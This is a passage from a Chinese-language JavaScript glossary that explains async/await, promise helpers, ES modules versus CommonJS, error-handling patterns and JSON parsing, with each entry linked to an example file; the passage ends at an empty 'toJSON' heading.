示例：[`18_async/06_promise_combinators.js`](18_async/06_promise_combinators.js)

### async / await

`async` 函数总是返回 Promise（返回值被自动包装），`await` 在函数内部「暂停」当前执行，等右侧 Promise 敲定后恢复，并把兑现值作为表达式结果、把拒绝理由作为抛出异常。它是**基于生成器 + Promise 的语法糖**：`await` 之后的代码相当于被放进 `then` 的续体，也就是进入**微任务队列**。常见误解有两处：`await` 并不会阻塞整个线程（只暂停当前 async 函数，其它任务照常跑）；在 `for` 循环里 `await` 是**串行**的，想并行要先 `Promise.all` 或先收集 Promise 再 await。

示例：[`18_async/07_async_await_basics.js`](18_async/07_async_await_basics.js)

### Top-level await（TLA，顶层 await）

允许在**模块顶层**（而不是函数内部）直接写 `await`，让整个模块的求值过程异步化：依赖它的模块会等它敲定后才继续执行。它主要服务于「加载配置、建立连接、动态导入后再初始化」这类「模块初始化本身就异步」的场景。**使用限制**：只在 ES Module 顶层可用（CJS 与脚本里会报错），且过度使用会让依赖图变成串行的瀑布，拖慢启动——能并行的地方用 `Promise.all` 合并 await。也见 Dynamic import（动态导入）。

示例：[`19_modules/09_dynamic_import.js`](19_modules/09_dynamic_import.js)

### await 的暂停与恢复

`await v` 的语义可以拆成三步：把 `v` 用 `Promise.resolve` 包装；**暂停**当前 async 函数并让出线程；在 `v` 敲定后把「后续代码」作为一个**微任务**重新入队并恢复执行。因此 `await` 之后的那一行至少也要等到当前同步代码跑完——这意味着 `await` 一个已经兑现的普通值仍然会让出一次。**关键细节**：恢复的位置是「微任务队列」，所以 `await` 的续体排在 `setTimeout` 之前、排在已有的微任务之后。

示例：[`18_async/07_async_await_basics.js`](18_async/07_async_await_basics.js)

### Unhandled Rejection（未处理的拒绝）

一个被拒绝的 Promise 若在「本轮事件循环结束前」没有被任何 `catch`/`onRejected` 处理，宿主就会把它报为「未处理的拒绝」：浏览器触发 `unhandledrejection` 事件，Node 默认打印警告并可能终止进程。它是异步代码里最隐蔽的错误泄漏源——比如 `async` 函数里 `await` 抛错却无人 `catch`，或者写了 `Promise.reject(x)` 却没有链尾处理。实践中应在进程级兜底（Node 的 `process.on('unhandledRejection')` / 浏览器事件监听）做日志与净化，但兜底**不能替代**局部的错误处理。也见 Async Error Handling（异步错误处理）。

示例：[`18_async/08_async_error_handling.js`](18_async/08_async_error_handling.js)

### Concurrency Control（并发控制）

限制「同一时刻最多有多少个异步任务在跑」的机制，典型实现是一个上限为 N 的信号量与一个等待队列。它解决的是「`Promise.all` 一口气打出上千个请求」造成的下游打爆、文件描述符耗尽、内存暴涨。关键在于它是**调度**而非组合：组合器只关心结果聚合，不关心同时跑几个。Node 生态常用 `p-limit` 这类库，也可以几十行自己写一个。也见 Sequential vs Parallel（串行与并行）。

示例：[`18_async/15_async_patterns.js`](18_async/15_async_patterns.js)

### Sequential vs Parallel（串行与并行）

串行是「前一个 await 完再发下一个」，总耗时是各步之和；并行是「先同时发起，再用 `Promise.all` 汇总」，总耗时约等于最慢的那个。**关键区分点在「发起时机」**：`await a(); await b();` 是串行，`const [r1, r2] = await Promise.all([a(), b()]);` 才是并行。常见误区是在 `map` 里写 `await` 却误以为在并行，以及为了「保险」把所有步骤都串起来导致接口慢好几倍。判断标准是「后一步是否依赖前一步的结果」——不依赖就该并行。

示例：[`18_async/09_async_sequential_vs_parallel.js`](18_async/09_async_sequential_vs_parallel.js)

### Promise.withResolvers（ES2024）

一个静态方法，一次性返回 `{ promise, resolve, reject }` 三件套，省掉了「先把 `resolve` 存到外层变量再去构造 Promise」的别扭写法，也不用再写 `let resolve; new Promise(r => resolve = r)`。它最适合「Promise 的敲定时机由外部事件决定」的场景：把 `resolve` 交给事件监听器、把 `reject` 交给超时定时器、把装饰过的 Promise 交给别的模块消费。语义细节与 `new Promise` 一致：返回的 `promise` 也是新的 pending Promise，`resolve`/`reject` 也只能生效一次。也见 Executor（执行器函数）。

示例：[`18_async/11_promise_static_methods.js`](18_async/11_promise_static_methods.js)

### Promise.try（ES2025）

`Promise.try(fn)` 用 Promise 的方式运行 `fn`：无论 `fn` 是**同步抛出**还是**返回被拒绝的 Promise**，结果都统一成一个被拒绝的 Promise，从而可以接 `.catch`。它解决的是「混合错误源」的经典痛点——`Promise.resolve().then(() => fn())` 是常见的手工替代，但更啰嗦且容易写错。有了它，调用一个「既可能同步 throws、又可能异步 reject」的函数时，只需一处 `catch` 就能兜住。也见 Promise、Async Error Handling（异步错误处理）。

示例：[`34_modern_es_features/07_promise_try_and_regexp_escape.js`](34_modern_es_features/07_promise_try_and_regexp_escape.js)

### Timeout Control（超时控制）

给异步操作设一个「最长等待时间」，到点就放弃等待并抛出超时错误。常见实现是 `Promise.race([task, timeoutReject])`，或使用 `AbortSignal.timeout(ms)`。**关键细节**：超时只是「我不再等了」，被等待的操作**仍在后台继续运行**（除非同时传入了取消信号），因此要意识到资源可能仍在被消耗。另一个坑是超时后忘了清理定时器，导致进程迟迟不退出。

示例：[`18_async/13_timeout_and_abort.js`](18_async/13_timeout_and_abort.js)

### AbortController / AbortSignal

标准的「取消」机制：`AbortController` 是控制器，它的 `signal` 属性是一个 `AbortSignal`，调用 `controller.abort(reason)` 会把信号置为已中止并触发 `abort` 事件。支持取消的 API（`fetch`、`fs`、流、`addEventListener`）都接受 `signal` 并据此中断自身工作、释放资源。它是 promise 生态里「取消语义」的通用答案：**Promise 本身不可取消**，所以取消必须由「接收信号的一方」主动配合实现。现代用法还包括 `AbortSignal.timeout(ms)` 与 `AbortSignal.any([...])` 组合多个信号。

示例：[`18_async/13_timeout_and_abort.js`](18_async/13_timeout_and_abort.js)

### promisify（回调转 Promise）

把「err-first 回调风格」的函数包装成返回 Promise 的函数，是贯通新旧 API 的胶水。Node 提供了 `util.promisify` 做标准形态的自动转换，手写版核心不过二十行：返回 `new Promise((resolve, reject) => fn(args, (err, val) => err ? reject(err) : resolve(val)))`。需要注意两点：并非所有回调 API 形态都符合 err-first 约定（有的回调有多个返回值，需要自定义 promisify 逻辑）；`fs/promises`、`timers/promises` 等已被官方 Promise 化的模块应优先使用。也见 Error-first Callback（错误优先回调）。

示例：[`18_async/14_promisify.js`](18_async/14_promisify.js)

### Retry（失败重试）

在异步操作失败后按策略重新尝试的模式。生产级实现要回答四个问题：最多试几次、每次等待多久（常用**指数退避**，即等待时间逐次翻倍）、是否加**随机抖动**（避免大量客户端同时重试造成惊群）、以及**哪些错误值得重试**（网络超时、5xx 值得重试，参数错误 4xx 重试多少次都没用）。实现上通常是一个带 `for` 循环与 `await` 延时的小函数，配合 `AbortSignal` 支持整体取消。也见 Throttle / Rate Limiting（限流）。

示例：[`18_async/15_async_patterns.js`](18_async/15_async_patterns.js)

### Throttle / Rate Limiting（限流）

控制「单位时间内允许发起多少请求或执行多少次操作」，与并发控制（同时跑几个）互补：并发限制的是**在途数量**，限流限制的是**速率**。常见实现有令牌桶（固定速率补充令牌，突发可透支）与滑动窗口（统计最近一段时间的次数）。在客户端侧它用于保护后端、遵守第三方 API 的配额；越界时会收到 429 并需要退避。也见 Concurrency Control（并发控制）。

示例：[`18_async/15_async_patterns.js`](18_async/15_async_patterns.js)

---

## 模块化

### Module（模块）

模块是一个「自带作用域、显式声明依赖与出口」的代码单元：内部顶层变量不会泄漏成全局，外部只能通过显式导出的名字访问。它是工程化的地基——带来封装、可测试、可复用、可静态分析（tree-shaking）等能力，也是「一个文件一个职责」得以落地的前提。JavaScript 的模块化经历过 IIFE、AMD、CommonJS，最终由语言标准统一为 ESM。也见 ESM、CommonJS（CJS）。

示例：[`19_modules/08_module_scope.js`](19_modules/08_module_scope.js)

### ESM（ECMAScript Modules，ES 模块）

语言标准化的模块系统，用 `import`/`export` 声明，浏览器用 `<script type="module">`、Node 用 `.mjs` 或在 `package.json` 里声明 `"type": "module"` 启用。它的三个特性定义了它的行为：**静态结构**（依赖在解析阶段就确定，因此可以 tree-shaking 与静态检查）、**实时绑定**（导入的是导出变量的活引用，会跟随变化）、**严格模式 + 模块作用域**（自动 strict，顶层 `this` 是 `undefined`）。**常见误解**：把 ESM 当成「换了个写法的 CommonJS」——它们的加载时机与绑定语义根本不同。

示例：[`19_modules/12_esm_vs_cjs.cjs`](19_modules/12_esm_vs_cjs.cjs)

### CommonJS（CJS）

Node 早期的模块系统，用 `require()` 同步加载、用 `module.exports`/`exports` 导出，文件的求值发生在 `require` 调用的当下（运行时、动态）。它适合服务端「启动时同步读文件」的场景，但难以做静态分析，也无法在浏览器直接使用。**易踩的坑**：给 `exports` 整体重新赋值（`exports = {...}`）会切断它与 `module.exports` 的联系，导出的是空对象——要整体替换必须写 `module.exports = {...}`。也见 ESM。

示例：[`19_modules/11_cjs_require.cjs`](19_modules/11_cjs_require.cjs)

### import / export

ESM 的两个声明式关键字。`export` 只能出现在模块顶层（不能写在 `if` 或函数里），`import` 声明会被**提升**并在模块求值前完成解析与连接，所以「先使用后 import」在书写顺序上没问题。`import` 的绑定是**只读**的（对导入名赋值会报 `TypeError`），但这不代表值不能变——改变的是模块内部（见 Live Binding）。命名冲突可用 `as` 重命名，整体引入用 `import * as ns`。也见 Named Export（具名导出）、Default Export（默认导出）。

示例：[`19_modules/01_named_exports.js`](19_modules/01_named_exports.js)

### Named Export（具名导出）

`export const a = 1` / `export function f() {}` / `export { x as y }` 形式，导入时必须用**同样的名字**（或用 `as` 改名），并且必须加花括号。它的优点是名字即契约、IDE 可精确跳转与重命名、利于 tree-shaking。一个模块可以有任意多个具名导出，它们之间是并列关系。也见 Default Export（默认导出）、Re-export（重导出）。

示例：[`19_modules/01_named_exports.js`](19_modules/01_named_exports.js)

### Default Export（默认导出）

`export default 值` 为模块提供一个「主出口」，导入时可以**任意命名**且不需要花括号：`import Anything from './m.js'`。它的本质是导出了一个名为 `default` 的具名绑定，因此可以 `import { default as X } from './m.js'`，也可以在 `export { x as default }` 里动态指定。**常见误解与建议**：默认导出对重构不友好（改名不会有任何提示）、与 CJS 互操作时容易踩坑（`require` 到的可能是 `{ default: ... }`），因此很多团队约定「优先具名导出」。也见 Named Export（具名导出）。

示例：[`19_modules/02_default_export.js`](19_modules/02_default_export.js)

### Re-export（重导出）

在模块里直接把别处的导出再导出去，语法是 `export { x } from './a.js'`、`export * from './a.js'`、`export * as ns from './a.js'`。它的价值在于**收敛出口**：内部目录结构可以随意调整，对外只暴露一条稳定路径；同时它不会在当前模块里创建同名局部变量（不像 import 后再 export）。注意 `export *` **不会**转发 `default`（默认导出需要显式 `export { default } from ...`），同名冲突时后者会静默覆盖或被忽略，需要显式 `as` 消歧。

示例：[`19_modules/05_reexport.js`](19_modules/05_reexport.js)

### Namespace Import（命名空间导入）

`import * as ns from './m.js'` 把模块的所有具名导出收集成一个「命名空间对象」挂在 `ns` 上。它有两个重要特性：这是一个**密封**对象（不能添加/删除属性，尝试写入会抛错），并且它的属性是**实时绑定的访问器**（读 `ns.count` 拿到的永远是当前值，而不是导入瞬间的快照）。命名空间对象**不包含** `default`（在 ESM 里 `default` 是个普通具名导出，但作为命名空间属性访问需谨慎，不同工具处理略有差异）。它适合「一个模块导出很多东西且要按前缀区分」的场景。也见 Live Binding（实时绑定）。

示例：[`19_modules/06_namespace_import.js`](19_modules/06_namespace_import.js)

### Live Binding（实时绑定）

ESM 的导入是**指向导出变量的活引用**，而不是导入那一刻的值拷贝：导出方修改了变量，导入方下一次读取就会看到新值。这让「模块级计数器」「配置热更新」这类模式天然可行，也让模块间共享可变状态变得直观。**关键对比**：CommonJS 导出的是**值的快照**（`module.exports.fn` 被重新赋值后，已 require 的一方仍持有旧引用），这是 ESM 与 CJS 最容易踩差异的地方。注意绑定是「只读引用」——导入方不能给它赋值。

示例：[`19_modules/07_live_bindings.js`](19_modules/07_live_bindings.js)

### Module Scope（模块作用域）

每个模块都有自己的顶层作用域：顶层 `var`/`let`/`const`/函数声明都**不会**挂到全局对象上，模块之间也不会互相污染。两个显著差异：ESM 顶层 `this` 是 `undefined`（CJS 里是 `module.exports`），且 ESM 自动运行在严格模式下。另一个常被忽略的特性是**模块只求值一次**——无论被 import 多少次、从多少条路径进来，同一个文件（同一解析结果）只会执行一遍，之后的导入直接复用已求值的模块记录。也见 Module Singleton（模块级单例）。

示例：[`19_modules/08_module_scope.js`](19_modules/08_module_scope.js)

### Dynamic import()（动态导入）

`import('./m.js')` 是**函数调用式**的导入，返回 `Promise<命名空间对象>`，因此可以写在任意位置、按条件或按需加载。它解决了静态 `import` 做不到的三件事：条件加载（只在特定环境加载某模块）、懒加载（路由/弹窗打开时才拉代码）、以及与 `import.meta` 配合做运行时计算路径。**常见误解**：以为它能像 `require` 一样同步拿到模块——它总是异步的，浏览器里还会真的发起一次网络请求。也见 Top-level await（顶层 await）。

示例：[`19_modules/09_dynamic_import.js`](19_modules/09_dynamic_import.js)

### import.meta

ESM 里唯一可用的「模块元信息」对象，最常用的属性是 `import.meta.url`（当前模块的文件 URL）。基于它可以算出当前目录：`import.meta.dirname` / `import.meta.filename`（Node 20.11+ 提供）相当于 ESM 版的 `__dirname` / `__filename`——因为在 ESM 里这两个 CJS 全局变量**根本不存在**，这是从 CJS 迁移时最常见的第一个报错。浏览器里 `import.meta.url` 常用于解析 worker 或资源路径。也见 ESM、CommonJS（CJS）。

示例：[`19_modules/10_import_meta.js`](19_modules/10_import_meta.js)

### Circular Dependency（循环依赖）

两个模块互相 import：A 依赖 B，B 又依赖 A。ESM 靠「先建立绑定、后求值」的机制允许它存在，但被循环引用的那个绑定在对方求值完成前访问可能触发 `ReferenceError`（TDZ）或拿到 `undefined`；CJS 则是「拿到半成品 exports 快照」，同样会出现 `undefined` 而更隐蔽。务实结论：循环依赖本身不是语法错误，但**行为依赖求值顺序**，容易产生难查的 `undefined`，能用依赖倒置、事件、或抽公共模块消除就消除。

示例：[`19_modules/15_circular_dependencies.js`](19_modules/15_circular_dependencies.js)

### Module Resolution（模块解析）

宿主根据说明符（specifier）找到真实文件的规则：`'./x.js'` 是相对路径（ESM 里**必须**写扩展名，不像 CJS 会自动补 `.js`/`/index.js`），`'node:fs'` 是内置模块，`'lodash'` 是裸说明符（去 `node_modules` 查找），`'#internal'` 是包内私有映射（`imports` 字段）。浏览器里裸说明符需要 import map 或打包器处理。理解解析顺序能省下大量「模块找不到」的排查时间：`ERR_MODULE_NOT_FOUND` 与 `ERR_PACKAGE_PATH_NOT_EXPORTED` 分别对应「没找到文件」与「被 exports 拦住了」。也见 package.json exports 字段。

示例：[`19_modules/13_json_import.js`](19_modules/13_json_import.js)

### package.json exports 字段

定义包的**对外入口清单**，支持子路径导出（`"."`、`"./feature/alpha"`）与条件导出（按 `import`/`require`/`node`/`browser`/`default` 分别指向不同文件）。它带来的重要变化是「**封装**」：一旦声明了 `exports`，包内未列出的路径一律无法被外部解析，报 `ERR_PACKAGE_PATH_NOT_EXPORTED`，这既能防止别人依赖内部实现，也常成为升级后的破坏性变更。配合 `"type": "module"` 可以声明包内 `.js` 默认按 ESM 还是 CJS 解析。也见 ESM、CommonJS（CJS）。

示例：[`19_modules/14_package_exports.js`](19_modules/14_package_exports.js)

### Module Singleton（模块级单例）

因为同一模块在同一个进程里只求值一次并被缓存，模块顶层声明的对象天然就是「全进程唯一」的——这是 JavaScript 里最简洁的单例实现，无需 `getInstance` 之类的样板。典型用途是数据库连接池、全局配置、日志器、缓存实例。**注意边界**：单例的「唯一性」范围是「同一个模块实例」——遇到多副本打包（同一模块被打进两个 bundle）、`node_modules` 里出现两份同包不同版本、或跨 Worker/进程时，单例会被复制成多份，这是很多「状态不同步」疑难杂症的根源。

示例：[`19_modules/_counter.js`](19_modules/_counter.js)

### Barrel File（桶文件）

把目录内多个模块的导出集中再导出的「汇总文件」（通常叫 `index.js`），让外部可以 `import { a, b } from './utils'` 而不是写一长串具体路径。它提升了调用方体验与内部重构自由度，但代价是：打包器可能因副作用分析失效而带上多余代码（tree-shaking 变差）、循环依赖更容易形成、大型 barrel 还会拖慢构建与类型检查。实践中建议只在「对外公开 API」层面用 barrel，内部模块之间直接按路径引用。

示例：[`19_modules/_barrel.js`](19_modules/_barrel.js)

---

## 错误处理

### Error（错误对象）

`Error` 是 JavaScript 内建的「错误载体」，实例主要提供三个属性：`message`（人类可读描述）、`name`（错误类型名）、`stack`（调用栈，非标准但各引擎都支持）。它的作用是**携带上下文**，让错误能在向上传播的每一层被识别与处理；`throw` 任何值在语法上都可以，但抛非 Error 值会丢失堆栈，因此不推荐。构造时还可传入 `cause` 选项来链接根因。也见 Exception（异常）、Custom Error Class（自定义错误类）。

示例：[`20_error_handling/03_error_properties.js`](20_error_handling/03_error_properties.js)

### Exception（异常）

异常是「打乱了正常控制流的意外事件」这一抽象概念，而 `Error` 是它在 JavaScript 里的具体表示。两者的区别值得记住：你可以 `throw 42`（抛出的是普通值，不是 Error，异常机制照样生效但丢了堆栈）；反过来，`Error` 实例被创建出来却从未 `throw`，就只是一段普通数据。**常见误解**：把「异常」等同「崩溃」——异常只是控制流的另一种出口，被 `catch` 捕获后程序可以继续正常运行。

示例：[`20_error_handling/04_throw_statement.js`](20_error_handling/04_throw_statement.js)

### throw（抛出）

`throw expr` 立即终止当前函数的正常执行，把 `expr` 作为异常向上传播，直到某个 `try...catch` 接住它；如果一路无人捕获，就会冒泡到顶层（浏览器报错到控制台，Node 终止进程）。它和 `return` 一样是「离开函数」的方式，但走的是另一条通道，因此**可以穿透多层调用**——这正是它比返回错误码更适合表达「无法继续」的原因。注意 `throw` 是语句，换行时不要写成 `throw\n new Error()`（自动分号插入会让它变成无参抛出）。

示例：[`20_error_handling/04_throw_statement.js`](20_error_handling/04_throw_statement.js)

### try / catch

`try` 块里抛出的异常会被紧邻的 `catch (e)` 捕获，`e` 是异常值（不写参数也可以，用于只做清理的旧式写法）。**关键细节**：`catch` 只能捕获 `try` 块内**同步执行路径**上的异常——`try { setTimeout(() => { throw e }) } catch {}` 抓不到，因为那时已经离开了 `try` 块；异步代码要用 `await` 让异常回到同步路径上，或在该异步回调内部自己 `try`。另外，`catch` 里不要空着什么都不做（吞异常），至少记录或重新抛出。也见 finally、Async Error Handling（异步错误处理）。

示例：[`20_error_handling/01_try_catch_finally.js`](20_error_handling/01_try_catch_finally.js)

### finally（最终执行块）

`finally` 块**无论** `try` 里是正常结束、`return`、还是抛出异常都会执行，是释放资源（关文件、断开连接、清除定时器、复位 loading 状态）的标准位置。它比 `catch` 更可靠地「一定会跑」，因此在 `try` 里写了 `return` 也阻止不了它。**唯一的例外**是进程直接退出或 `finally` 内部的无限循环。它也常与 `catch` 搭配使用：捕获、记录、再向上抛。

示例：[`20_error_handling/01_try_catch_finally.js`](20_error_handling/01_try_catch_finally.js)

### finally 返回值覆盖陷阱

如果 `finally` 块里写了 `return`（或 `throw`），它会**覆盖** `try`/`catch` 中的 `return` 值和抛出的异常——这会让异常被静默吞掉，是最经典的一类诡异 bug。例如 `try { throw new Error('x') } finally { return 1 }` 会返回 `1` 而不抛错；`try { return 1 } finally { return 2 }` 返回 `2`。**规避原则**：`finally` 里只做清理，不要写 `return`、`break`、`continue` 或可能抛错的危险操作；清理本身失败时应当显式处理，而不是任其改写控制流。也见 finally、SuppressedError。

示例：[`20_error_handling/01_try_catch_finally.js`](20_error_handling/01_try_catch_finally.js)

### Error Propagation（错误传播）

错误向上冒泡直到被处理的过程。实践中的分层原则是「**早抛晚捕**」：底层库在发现非法状态时立刻抛出带上下文的错误（越早越好，因为此时上下文最完整），由最外层知道「该怎么办」的那一层捕获并决定重试、降级、还是提示用户；中间层如果必须处理，就用 `error.cause` 包装后继续上抛，而不是吞掉。**反模式的两种极端**是「到处 `try/catch` 然后 `console.log` 一下了事」和「任何地方都不处理」。

示例：[`20_error_handling/08_error_handling_patterns.js`](20_error_handling/08_error_handling_patterns.js)

### Error Boundary（错误边界）

「在某个边界内消化掉错误，不让它继续往上炸」的结构。它有两层含义：在前端框架里是组件级的错误边界（React 的 `componentDidCatch` / `getDerivedStateFromError`，捕获子树渲染错误并显示兜底 UI）；在通用后端/服务层则是「每个请求或任务自己兜住异常」，避免一个任务的失败拖垮整个进程。核心思想一致：**在正确的层级设置故障隔离带**，让失败局部化，并保证兜底路径本身不再抛错。也见 Fail Fast、Error Propagation（错误传播）。

示例：[`20_error_handling/08_error_handling_patterns.js`](20_error_handling/08_error_handling_patterns.js)

### Built-in Error Types（内置错误类型）

标准库预置的几种 `Error` 子类，引擎在不同场景自动抛出，用来区分「哪类问题」：`TypeError`（值的类型不符合预期，如 `undefined.foo`、调用非函数、对只读属性赋值）、`RangeError`（值超出允许范围，如 `new Array(-1)`、栈溢出、`toFixed(101)`）、`ReferenceError`（访问不存在的变量名，是 TDZ 与拼写错误的典型报错）、`SyntaxError`（语法不合法，注意它常常在**解析阶段**就抛出，`try/catch` 也救不了，`JSON.parse` 的 `SyntaxError` 则是运行时抛的）。此外还有 `URIError`、`EvalError`（几乎不再出现）以及异步聚合类错误。**实用价值**：用 `instanceof` 区分错误类型，可以只对可恢复的错误做重试或降级。

示例：[`20_error_handling/02_error_types.js`](20_error_handling/02_error_types.js)

### Custom Error Class（自定义错误类）

通过 `class MyError extends Error {}` 定义业务错误类型，从而能用 `instanceof MyError` 精确捕获、并在错误对象上携带结构化字段（如 `code`、`status`、`field`、`retryable`）。有两个必踩的坑：一是**务必在构造函数里修正 `name`**（`this.name = 'MyError'`），否则日志里显示的还是 `Error`；二是修正原型链，现代语法下 `extends Error` 已自动处理，但若编译目标是 ES5 则需要 `Object.setPrototypeOf(this, MyError.prototype)`。实践建议还包一层 `captureStackTrace` 以获得干净的堆栈。也见 Built-in Error Types（内置错误类型）。

示例：[`20_error_handling/05_custom_errors.js`](20_error_handling/05_custom_errors.js)

### error.cause（错误链）

`new Error('高层失败', { cause: lowLevelError })` 允许在抛出新错误时**保留原始错误**，通过 `err.cause` 访问，从而形成一条错误链。它解决的是「包装错误必然丢失根因」的老问题：以前要么原样抛出（缺少业务上下文），要么抛新错误（丢失底层细节），现在两者可以兼得。配套的读取方式是 `err.cause` 逐层向下遍历，或在 Node 里用 `util.inspect(err, { depth: 5 })`、`err.errors` 查看全貌。也见 Error Propagation（错误传播）、AggregateError。

示例：[`20_error_handling/06_error_cause.js`](20_error_handling/06_error_cause.js)

### AggregateError（聚合错误，ES2021）

一种把**多个错误打包成一个**的错误类型，通过 `errors` 属性访问其中的错误数组：`new AggregateError([e1, e2], '批量失败')`。最典型的抛出者是 `Promise.any`——当所有候选 Promise 都失败时，它抛出的正是 `AggregateError`，`errors` 里按顺序装着每一份拒绝理由。它适合「一次操作里多个子项同时失败」的场景：表单多项校验、批量导入部分行非法、并发任务汇总。**常见误解**：以为它能替代 `cause`——`cause` 是单向链（A 由 B 引起），`AggregateError` 是并列表（A 同时包含 B 和 C）。

示例：[`20_error_handling/07_aggregate_error.js`](20_error_handling/07_aggregate_error.js)

### SuppressedError（被压制错误，ES2025）

当「处理错误的清理过程中又抛出了新错误」时，用来同时保存**原错误**与**压制它的新错误**的类型，属性为 `error`（新错误）与 `suppressed`（被压制的原错误）。它是配合显式资源管理（`using` / `await using`）引入的：释放资源的 `Symbol.dispose` 若在异常展开期间抛错，引擎就会用 `SuppressedError` 把两者一起抛出来，避免原错误被静默吞掉。它补上了「清理代码覆盖原始异常」这一长期存在的语义漏洞（对照 `finally` 里 `return`/`throw` 的覆盖陷阱）。也见 finally 返回值覆盖陷阱、AggregateError。

示例：[`20_error_handling/07_aggregate_error.js`](20_error_handling/07_aggregate_error.js)

### Error-first Callback（错误优先回调）

Node 的核心回调约定：回调的第一个参数**保留给错误**（成功时为 `null` 或 `undefined`），第二个参数才是结果，即 `(err, data) => {}`。它的价值是让「失败」与「成功」共用一条代码路径，调用方必须先判断 `err`，从而强迫处理错误；同时这个统一形态让自动 promisify 成为可能。**关键细节**：约定要求回调**恰好被调用一次**、且失败时第一个参数必须是 Error 实例（而不是字符串或错误码）。也见 promisify（回调转 Promise）、Callback Function（回调函数）。

示例：[`18_async/14_promisify.js`](18_async/14_promisify.js)

### Defensive Programming（防御式编程）

在代码边界处主动校验输入、不信任外部数据（用户输入、接口响应、文件内容、URL 参数），以便在问题扩散前就把它挡住。手段包括参数校验、类型守卫（`typeof`/`Array.isArray`/`instanceof`）、默认值、可选链与空值合并、以及把「不该发生的状态」变成显式的抛错。它与 Fail Fast 是同一思路的两面：**边界处宽容（给出清晰提示），内部严格（断言不变量）**。需要避免的过度防御是到处 `if (x != null)` 把真正的 bug 掩盖成静默的 `undefined`。也见 Fail Fast、Assertion（断言）。

示例：[`20_error_handling/12_defensive_programming.js`](20_error_handling/12_defensive_programming.js)

### Fail Fast（快速失败）

一旦检测到无法继续的错误状态就**立刻抛出**，而不是带着错误状态勉强往下跑。它的收益是：错误发生点与暴露点接近，堆栈与上下文完整，排查成本最低；否则错误会以「奇怪的 `undefined`」「错误的计算结果」等形式在很远的地方浮现，定位起来极其痛苦。实现要点是优先用 `throw` 而不是返回错误码/`null`，并且不要写「捕获后继续当没事发生」的 `catch`。也见 Assertion（断言）、Defensive Programming（防御式编程）。

示例：[`20_error_handling/12_defensive_programming.js`](20_error_handling/12_defensive_programming.js)

### Assertion（断言）

用「如果条件不成立就说明程序有 bug」的语气写检查，代表 API 是 `assert(条件, 消息)`，或 Node 的断言模块提供的 `assert.strictEqual`、`assert.deepStrictEqual`、`assert.throws` 等。它与普通错误处理的区别在**语义定位**：断言针对「内部不变量被破坏（程序员错误）」，不该用于校验用户输入这类「预期内的失败」；断言失败表示代码写错了，而不是环境出了问题。在测试中被大量用于验证行为，在生产代码中通常只在开发期启用（生产可被裁剪）。也见 Fail Fast、Defensive Programming（防御式编程）。

示例：[`20_error_handling/11_assertion.js`](20_error_handling/11_assertion.js)

### Node Error Code（错误码 err.code）

Node 的 I/O 与系统调用错误会在 Error 实例上附加 `code` 属性（如 `ENOENT` 文件不存在、`EACCES` 权限不足、`EEXIST` 已存在、`EISDIR` 期望文件却是目录、`ECONNREFUSED` 连接被拒），用于**在不依赖错误文案的前提下**做程序化判断。**关键细节**：不要去匹配 `err.message` 字符串——文案会随版本和语言环境变化，`err.code` 才是稳定契约。此外还有 `errno`、`syscall`、`path` 等辅助字段可以提供更具体的上下文。也见 Custom Error Class（自定义错误类）。

示例：[`20_error_handling/10_node_error_codes.js`](20_error_handling/10_node_error_codes.js)

---

## JSON

### JSON（JavaScript Object Notation，JS 对象表示法）

一种**语言无关的文本数据交换格式**，源自 JavaScript 的对象字面量语法但只保留了一个更严格的子集。它只有六种值类型：对象、数组、字符串、数字、布尔、`null`，因此能表达的东西非常有限却因此极为通用。**与 JS 对象字面量的关键差异**：键必须用双引号、不能有尾逗号、不能有注释、不能出现 `undefined`/函数/`NaN`/`Infinity`、字符串只能用双引号。这些差异正是 `JSON.parse` 报 `SyntaxError` 的常见原因。也见 JSON.parse、JSON.stringify。

示例：[`21_json/02_json_format_rules.js`](21_json/02_json_format_rules.js)

### Serialization / Deserialization（序列化与反序列化）

序列化是「把内存中的数据结构转成可存储/可传输的字节流或文本」的过程，反序列化是其逆过程。JSON 是最常见的载体，但不是唯一——二进制协议、`structuredClone`、`v8.serialize`、Protocol Buffers 都各有所长，选择取决于「是否需要保真类型」。**核心代价**：序列化是**有损**的，类型信息会丢失，所以「反序列化回来和原来一模一样」通常不成立（这也是 `JSON` 深拷贝有坑的根源）。也见 JSON.parse、JSON.stringify、序列化陷阱。

示例：[`21_json/01_parse_and_stringify.js`](21_json/01_parse_and_stringify.js)

### JSON.parse（解析）

把 JSON 文本解析成 JavaScript 值，语法是 `JSON.parse(text, reviver?)`。**关键特性与坑**：它要求输入是**完整且合法**的 JSON，多一个尾逗号都会抛 `SyntaxError`，而且这个错误发生在运行时（可以用 `try/catch` 接住）；解析结果里的数字一律是双精度 `Number`，因此超过 2^53 的大整数会**静默丢精度**；`__proto__` 键在新标准下被安全处理，历史上曾是原型污染漏洞的来源（对象字面量赋值式解析）。解析大型文本时还要注意它会一次性占用内存。也见 reviver、大整数精度。

示例：[`21_json/01_parse_and_stringify.js`](21_json/01_parse_and_stringify.js)

### JSON.stringify（序列化）

把 JavaScript 值转成 JSON 文本，完整签名是 `JSON.stringify(value, replacer?, space?)`。第三个参数 `space` 控制缩进（数字表示空格数，字符串表示缩进字符），用于生成可读的格式化输出。**关键行为**：它按「对象自有可枚举属性」遍历，并且会先调用值上的 `toJSON()`；遇到 `undefined`、函数、Symbol 作为**属性值**时直接跳过该键，作为**数组元素**时替换为 `null`。另一个必须记住的点是：它会**抛 `TypeError`** —— 遇到 `BigInt` 或循环引用时。也见 replacer、toJSON、循环引用。

示例：[`21_json/01_parse_and_stringify.js`](21_json/01_parse_and_stringify.js)

### replacer（替换器）

`JSON.stringify` 的第二个参数，用来在序列化时过滤或改写数据：传**数组**时相当于白名单（只保留列出的键），传**函数**时每个键值对都会调用一次 `replacer(key, value)`，其返回值取代原值，返回 `undefined` 则该键被删除。**关键细节**：函数形式会被**自下而上**调用（先子后父），第一次调用的 `key` 是空字符串 `''`、`value` 是顶层值，且 `replacer` 里的 `this` 指向当前所在的对象（因此可以用箭头函数外的普通函数访问同级属性）。也见 reviver、toJSON。

示例：[`21_json/03_replacer_and_reviver.js`](21_json/03_replacer_and_reviver.js)

### reviver（还原器）

`JSON.parse` 的第二个参数，一个 `(key, value) => newValue` 的函数，在解析过程中被**自下而上**（先子后父）调用，可用于类型恢复（把 ISO 字符串还原成 `Date`、把特殊标记还原成 `Map`）或数据清洗。返回 `undefined` 会**删除**该属性。**常见误解**：以为在 `reviver` 里能拿到原始文本——普通 `value` 已经是解析后的值了，想要原文必须用第三参数 `context.source`。也见 replacer、reviver 的 context.source。

示例：[`21_json/03_replacer_and_reviver.js`](21_json/03_replacer_and_reviver.js)

### toJSON（自定义序列化出口）

